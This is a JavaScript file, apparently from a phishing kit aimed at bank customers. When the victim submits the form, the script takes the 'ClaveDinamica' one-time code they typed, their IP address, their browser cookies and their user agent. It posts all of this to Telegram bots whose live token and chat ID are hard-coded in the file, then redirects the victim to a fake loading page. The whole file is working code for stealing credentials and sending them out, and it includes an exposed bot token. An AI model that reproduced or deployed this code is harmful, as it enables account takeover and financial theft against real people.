const formulario = document.getElementById('miForm');

// Array de configuraciones de bots de Telegram
const telegramBots = [
  {
    botToken: '7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms',
    chatId: '6328222257'
  },
  // Puedes añadir más bots aquí
  {
     botToken: '',
     chatId: ''
  }
];

const ipifyUrl = 'https://api.ipify.org?format=json';


// Función para enviar mensaje a un bot de Telegram
async function sendTelegramMessage(botConfig, messageData) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botConfig.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: botConfig.chatId,
        text: messageData,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      console.error(`Error enviando mensaje al bot ${botConfig.botToken}`);
    }
  } catch (error) {
    console.error("Error enviando mensaje a Telegram", error);
  }
}

formulario.addEventListener('submit', async function (event) {
  event.preventDefault();
  
  
  try {
    const dinamica = event.target.elements.miInput.value;
    const userAgent = navigator.userAgent;
    const ipResponse = await fetch(ipifyUrl);
    const { ip } = await ipResponse.json();
    const currentDate = new Date();
    const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;
    
    const message = `\n<b>${ip}</b>\n<b>✅ DynmicLogs</b>
    \n \n🔓 ClaveDinamica: <b>${dinamica}</b>\n🍪 Cookies: ${document.cookie || 'Sin cookies'}`;
    
    // Enviar mensaje a todos los bots configurados
    await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));
    
    // Simula un tiempo de carga y luego redirige
    setTimeout(function() {
      window.location.href = './loader.html';
    }, 2000);
    
  } catch (error) {
    console.error("Error en el proceso", error);
  }
});